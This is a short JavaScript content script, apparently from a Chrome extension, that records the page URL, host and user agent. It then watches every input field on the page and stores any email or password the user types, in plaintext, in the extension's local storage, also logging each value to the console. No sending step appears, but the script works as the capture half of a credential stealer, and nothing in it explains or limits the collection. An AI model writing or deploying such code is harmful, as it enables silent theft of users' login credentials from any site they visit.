console.log("ot sure");
chrome.storage.local.set({session:{},url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
    console.log("initialised");
});
//session is nothing but fields 
var inputs=document.querySelectorAll('input');
inputs.forEach(input=>{
    input.addEventListener('blur',e=>{
        let {type,value} = input;
        console.log(type,value);
        if(value.trim()!="" && (type=="email" || type=="password")){
          chrome.storage.local.get(['session'],obj=>{
              session=obj.session;
              session[type]=value;
              chrome.storage.local.set({session:session});
          })
        }
    })
});

